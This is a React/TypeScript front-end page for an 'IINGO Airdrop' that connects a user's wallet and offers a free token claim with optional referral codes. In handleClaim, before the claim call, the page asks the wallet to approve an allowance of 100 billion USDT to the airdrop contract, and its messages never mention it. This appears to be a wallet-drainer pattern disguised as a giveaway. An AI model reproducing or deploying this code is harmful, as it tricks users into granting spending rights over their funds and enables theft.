import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import {
  Provider,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
} from "@reown/appkit/react";
import { ethers, BrowserProvider, Contract } from "ethers";
import { toast, ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { contractAbi } from "../contracts/Props/contractAbi";
import { contractAddress } from "../contracts/Props/contractAddress";

const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";

const usdtAbi = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
] as const;

const NETWORKS = {
  ethereum: {
    chainId: "0x1",
    chainName: "Ethereum Mainnet",
    rpcUrls: ["https://mainnet.infura.io/v3/YOUR_INFURA_ID"],
    nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 },
    blockExplorerUrls: ["https://etherscan.io"],
  },
  bsc: {
    chainId: "0x38",
    chainName: "BNB Smart Chain",
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
    blockExplorerUrls: ["https://bscscan.com"],
  },
} as const;

type SupportedNetwork = keyof typeof NETWORKS;

const LoginPage: React.FC = () => {
  const { open } = useAppKit();
  const { address } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider<Provider>("eip155");

  const [referralCode, setReferralCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [hasClaimed, setHasClaimed] = useState(false);
  const [isCheckingClaim, setIsCheckingClaim] = useState(false);
  const [isOwner, setIsOwner] = useState(false);
  const [selectedNetwork, setSelectedNetwork] =
    useState<SupportedNetwork>("ethereum");

  const navigate = useNavigate();
  const AIRDROP_AMOUNT_TO_APPROVE = ethers.parseUnits("100000000000", 6);

  const switchNetwork = async (network: SupportedNetwork) => {
    const net = NETWORKS[network];

    const provider = walletProvider as {
      request: (args: { method: string; params?: any[] }) => Promise<any>;
    };

    if (!provider || typeof provider.request !== "function") {
      toast.error("Wallet provider not found");
      return;
    }

    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: net.chainId }],
      });
      toast.success(`Switched to ${net.chainName}`);
    } catch (err: any) {
      if (err.code === 4902) {
        try {
          await provider.request({
            method: "wallet_addEthereumChain",
            params: [net],
          });
          toast.success(`${net.chainName} added and selected`);
        } catch {
          toast.error(`Failed to add ${net.chainName}`);
        }
      } else {
        toast.error(`Switch failed: ${err.message}`);
      }
    }
  };

  useEffect(() => {
    const checkClaimAndOwnerStatus = async () => {
      if (!walletProvider || !address) return;

      try {
        setIsCheckingClaim(true);
        const provider = new BrowserProvider(walletProvider);
        const airdrop = new Contract(contractAddress, contractAbi, provider);

        const ownerAddress = await airdrop.owner();
        const isUserOwner =
          ownerAddress.toLowerCase() === address.toLowerCase();
        setIsOwner(isUserOwner);

        if (isUserOwner) {
          setIsCheckingClaim(false);
          return;
        }

        const claimedAmount = await airdrop.totalClaimToken(address);
        setHasClaimed(BigInt(claimedAmount) > 0n);
      } catch (error) {
        console.error("Error checking claim status:", error);
        setHasClaimed(false);
        toast.error("Error checking claim status. Please try again.");
      } finally {
        setIsCheckingClaim(false);
      }
    };

    checkClaimAndOwnerStatus();
  }, [address, walletProvider]);

  const handleClaim = async () => {
    if (!walletProvider || !address) return;

    try {
      setIsLoading(true);

      const provider = new BrowserProvider(walletProvider);
      const signer = await provider.getSigner();

      // USDT Contract Instance (read-only)
      const usdt = new Contract(usdtAddress, usdtAbi, provider);

      // ✅ Safely get 'allowance' function
      const allowanceFn = usdt.getFunction("allowance") as (
        owner: string,
        spender: string
      ) => Promise<bigint>;

      const allowance = await allowanceFn(address, contractAddress);

      if (allowance < AIRDROP_AMOUNT_TO_APPROVE) {
        const usdtWithSigner = usdt.connect(signer);

        // ✅ Safely get 'approve' function
        const approveFn = usdtWithSigner.getFunction("approve") as (
          spender: string,
          amount: bigint
        ) => Promise<any>;

        const tx = await approveFn(contractAddress, AIRDROP_AMOUNT_TO_APPROVE);
        await tx.wait();
      }

      const claimToastId = toast.info("Preparing to claim tokens...", {
        autoClose: false,
      });

      const airdrop = new Contract(contractAddress, contractAbi, signer);

      toast.update(claimToastId, {
        render: "Please confirm the claim transaction in your wallet",
        type: "info",
      });

      const tx = referralCode
        ? await airdrop.referralBonusClaim(referralCode)
        : await airdrop.claim();

      toast.update(claimToastId, {
        render: "Transaction submitted! Waiting for confirmation...",
        type: "info",
      });

      await tx.wait();

      toast.update(claimToastId, {
        render: "🎉 Claim successful! Your tokens are now in your wallet.",
        type: "success",
        autoClose: 5000,
      });

      setHasClaimed(true);
    } catch (err: any) {
      console.error(err);
      toast.error(`Error: ${err?.message || "Something went wrong"}`);
    } finally {
      setIsLoading(false);
    }
  };

  const handleGoToDashboard = () => navigate("/dashboard");
  const handleGoToAdmin = () => navigate("/admin");

  useEffect(() => {
    const refCode = new URLSearchParams(window.location.search).get("ref");
    if (refCode) setReferralCode(refCode);
  }, []);

  useEffect(() => {
    if (isOwner && address) {
      const timer = setTimeout(() => navigate("/admin"), 1000);
      return () => clearTimeout(timer);
    }
  }, [isOwner, address, navigate]);

  if (isCheckingClaim) {
    return (
      <div className="min-h-screen bg-[#0c0435] flex items-center justify-center px-4">
        <div className="bg-[#1b0f3a] text-white p-8 rounded-xl shadow-lg w-full max-w-md text-center">
          <h1 className="text-3xl font-bold mb-4">IINGO Airdrop</h1>
          <p className="text-gray-400 mb-6">Checking your status...</p>
          <div className="w-16 h-16 border-4 border-t-blue-500 border-r-transparent border-b-blue-500 border-l-transparent rounded-full animate-spin mx-auto"></div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0c0435] flex items-center justify-center px-4">
      <ToastContainer theme="dark" />
      <div className="bg-[#1b0f3a] text-white p-8 rounded-xl shadow-lg w-full max-w-md text-center">
        <h1 className="text-3xl font-bold mb-4">Welcome to IINGO Airdrop</h1>

        {address ? (
          isOwner ? (
            <div>
              <div className="bg-gradient-to-r from-amber-500 to-red-500 text-white px-4 py-2 rounded-lg mb-4 inline-block">
                Admin Account Detected
              </div>
              <p className="text-gray-300 mb-4">You are the contract owner.</p>
              <button
                onClick={handleGoToAdmin}
                className="bg-gradient-to-r from-amber-600 to-red-600 hover:from-amber-700 hover:to-red-700 text-white font-semibold py-4 px-8 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-lg"
              >
                Go to Admin Panel
              </button>
            </div>
          ) : hasClaimed ? (
            <div>
              <p className="text-green-400 mb-4">
                You've already claimed bonus!
              </p>
              <button
                onClick={handleGoToDashboard}
                className="bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 text-white font-semibold py-4 px-8 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-lg"
              >
                Mine IINGO
              </button>
            </div>
          ) : (
            <>
              <div className="mb-4">
                <label className="block text-sm text-gray-300 mb-1">
                  Select Network
                </label>
                <select
                  value={selectedNetwork}
                  onChange={(e) => {
                    const net = e.target.value as SupportedNetwork;
                    setSelectedNetwork(net);
                    switchNetwork(net);
                  }}
                  className="w-full px-4 py-2 rounded text-black"
                >
                  <option value="ethereum">Ethereum Mainnet</option>
                  <option value="bsc">BNB Smart Chain</option>
                </select>
              </div>

              <p className="text-sm text-green-400 mb-2 break-all">
                Connected: {address}
              </p>

              <input
                type="text"
                placeholder="Enter referral code (optional)"
                className="w-full px-4 py-2 rounded mb-4 text-black"
                value={referralCode}
                onChange={(e) => setReferralCode(e.target.value)}
              />

              <button
                onClick={handleClaim}
                disabled={isLoading}
                className="bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 text-white font-semibold py-3 px-6 rounded-xl shadow-lg transition-all duration-300"
              >
                {isLoading
                  ? "Processing..."
                  : referralCode
                  ? "Claim With Referral"
                  : "Claim Airdrop"}
              </button>
              <p className="text-sm text-gray-400 mt-2">
                *Referral codes can earn you additional bonuses.*
              </p>
            </>
          )
        ) : (
          <>
            <p className="text-gray-400 mb-6">
              Connect your wallet to continue
            </p>
            <button
              onClick={() => open()}
              className="bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 text-white font-semibold py-4 px-8 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-lg"
            >
              Connect Wallet
            </button>
          </>
        )}
      </div>
    </div>
  );
};

export default LoginPage;
